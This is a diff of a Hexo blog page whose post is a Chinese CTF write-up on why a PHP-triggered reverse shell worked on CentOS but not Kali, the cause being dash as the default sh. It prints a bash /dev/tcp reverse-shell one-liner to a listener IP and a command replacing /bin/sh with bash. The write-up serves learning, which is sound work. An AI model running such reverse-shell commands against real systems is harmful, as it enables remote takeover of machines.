@@ -70,7 +70,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="杂记," />
 
 
 
@@ -86,16 +86,26 @@
 
 
 
-<meta name="description" content="一些笔记和记录">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MapleGe">
-<meta property="og:url" content="http://maplege.github.io/tags/meterpreter/index.html">
+<meta name="description" content="在复现一个CTF题时，上传上去了一句话木马，但是不允许用菜刀连接，所以我是想vps上监听一个端口，然后直接用hackbar反弹shell，结果死活反弹不回来。而在我印象中是有直接使用hackbar反弹shell成功的前例。因而有了此篇文章。">
+<meta name="keywords" content="杂记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于Centos与Ubuntu使用php反弹shell结果不同的问题">
+<meta property="og:url" content="http://maplege.github.io/2019/01/15/reverse-shell-diff/index.html">
 <meta property="og:site_name" content="MapleGe">
-<meta property="og:description" content="一些笔记和记录">
+<meta property="og:description" content="在复现一个CTF题时，上传上去了一句话木马，但是不允许用菜刀连接，所以我是想vps上监听一个端口，然后直接用hackbar反弹shell，结果死活反弹不回来。而在我印象中是有直接使用hackbar反弹shell成功的前例。因而有了此篇文章。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115161336.png">
+<meta property="og:image" content="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115161412.png">
+<meta property="og:image" content="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115161457.png">
+<meta property="og:image" content="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115161623.png">
+<meta property="og:image" content="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115162727.png">
+<meta property="og:image" content="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115163201.png">
+<meta property="og:image" content="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115163130.png">
+<meta property="og:updated_time" content="2019-01-15T08:41:12.695Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MapleGe">
-<meta name="twitter:description" content="一些笔记和记录">
+<meta name="twitter:title" content="关于Centos与Ubuntu使用php反弹shell结果不同的问题">
+<meta name="twitter:description" content="在复现一个CTF题时，上传上去了一句话木马，但是不允许用菜刀连接，所以我是想vps上监听一个端口，然后直接用hackbar反弹shell，结果死活反弹不回来。而在我印象中是有直接使用hackbar反弹shell成功的前例。因而有了此篇文章。">
+<meta name="twitter:image" content="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115161336.png">
 
 
 
@@ -125,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="http://maplege.github.io/tags/meterpreter/"/>
+  <link rel="canonical" href="http://maplege.github.io/2019/01/15/reverse-shell-diff/"/>
 
 
 
 
 
-  <title>标签: meterpreter | MapleGe</title>
+  <title>关于Centos与Ubuntu使用php反弹shell结果不同的问题 | MapleGe</title>
   
 
 
@@ -150,7 +160,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -288,54 +298,271 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>meterpreter<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://maplege.github.io/2019/01/15/reverse-shell-diff/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="暮沉沉">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://img.jsqq.net/uploads/allimg/150111/1_150111080328_19.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MapleGe">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2017/09/16/meterpreterCommand/" itemprop="url">
-              
-                <span itemprop="name">meterpreter常用命令+脚本</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">关于Centos与Ubuntu使用php反弹shell结果不同的问题</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-16T18:36:05+08:00"
-              content="2017-09-16" >
-          09-16
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-15T16:40:01+08:00">
+                2019-01-15
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/杂记/" itemprop="url" rel="index">
+                    <span itemprop="name">杂记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  361
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在复现一个CTF题时，上传上去了一句话木马，但是不允许用菜刀连接，所以我是想vps上监听一个端口，然后直接用hackbar反弹shell，结果死活反弹不回来。而在我印象中是有直接使用hackbar反弹shell成功的前例。因而有了此篇文章。<br><a id="more"></a><br>刚开始是在kali上测试的，也是死活谈不回来</p>
+<p>正常的反弹命令：<code>bash -i &gt;&amp;/dev/tcp/192.168.1.103/123 0&gt;&amp;1</code><br>然后由于是在post中，所以需要给&amp;编码，变成%26，可是还是弹不回来？？？</p>
+<p>后来试着在kali终端中直接执行这条命令，没问题，能弹回来</p>
+<p>然后写了一个php脚本，内容如下：</p>
+<p><img src="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115161336.png" alt=""></p>
+<p>然后，执行该脚本，他丫的居然报错了？？？</p>
+<p><img src="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115161412.png" alt=""></p>
+<p>我去？什么鬼？</p>
+<p>后来在Centos7中创建了同样的一个脚本，执行得到如下结果：</p>
+<p><img src="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115161457.png" alt=""></p>
+<p>这个为啥就成功弹回来了？？？不科学伐！！！</p>
+<p>经过测试得到，Centos7中可以弹回shell，而kali就是不行！！！</p>
+<p>后来网上搜索了一下解决方法，是因为ubuntu从6.10开始，默认使用dash（登录还是用bash），因为dash更快更高效。只要把bash链接到sh即可。。。</p>
+<p><img src="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115161623.png" alt=""></p>
+<p>可以看到kali中确实sh默认是链接的dash</p>
+<p><img src="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115162727.png" alt=""></p>
+<p>将bash链接到sh后，再次执行该脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mv /bin/sh /bin/sh.orig</div><div class="line">ln -s /bin/bash /bin/sh</div></pre></td></tr></table></figure>
+<p><img src="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115163201.png" alt=""></p>
+<p>然后就可以成功的弹回shell了</p>
+<p><img src="https://maplege-1257289410.cos.ap-beijing.myqcloud.com/imgs/20190115163130.png" alt=""></p>
 
       
     </div>
+    
+    
+    
 
+	
+	  <div>
+	     
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+    
+    <!-- JS库 sweetalert 可修改路径 -->
+	  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+	    <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+		  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+		    <p><span>本文标题:</span><a href="/2019/01/15/reverse-shell-diff/">关于Centos与Ubuntu使用php反弹shell结果不同的问题</a></p>
+			  <p><span>文章作者:</span><a href="/" title="访问 暮沉沉 的个人博客">暮沉沉</a></p>
+			    <p><span>发布时间:</span>2019年01月15日 - 16:01</p>
+				  <p><span>最后更新:</span>2019年01月15日 - 16:01</p>
+				    <p><span>原始链接:</span><a href="/2019/01/15/reverse-shell-diff/" title="关于Centos与Ubuntu使用php反弹shell结果不同的问题">http://maplege.github.io/2019/01/15/reverse-shell-diff/</a>
+					    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://maplege.github.io/2019/01/15/reverse-shell-diff/"  aria-label="复制成功！"></i></span>
+						  </p>
+						    <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+							</div>
+							<script> 
+							    var clipboard = new Clipboard('.fa-clipboard');
+								    clipboard.on('success', $(function(){
+												      $(".fa-clipboard").click(function(){
+															          swal({   
+																			            title: "",   
+																						          text: '复制成功',   
+																								            html: false,
+																											          timer: 500,   
+																													            showConfirmButton: false
+																																        });
+																	        });
+													      }));  
+</script>
+
+
+	  </div>
+	
+
+
+    
+
+	
+	  <div>
+	    
+<div>
+    
+	        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+			    
+				</div>
+
+	  </div>
+	
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/杂记/" rel="tag"><i class="fa fa-tag"></i> 杂记</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/13/mysql-sleep-and-or/" rel="next" title="延时盲注关于优先级的发现">
+                <i class="fa fa-chevron-left"></i> 延时盲注关于优先级的发现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -343,6 +570,12 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MDk0OC8xNzQ3Mw=="></div>
+    
+  </div>
+
 
         </div>
         
@@ -571,10 +804,10 @@
   
 
   
-    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
 
-  
+
 
   
 
@@ -603,6 +836,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
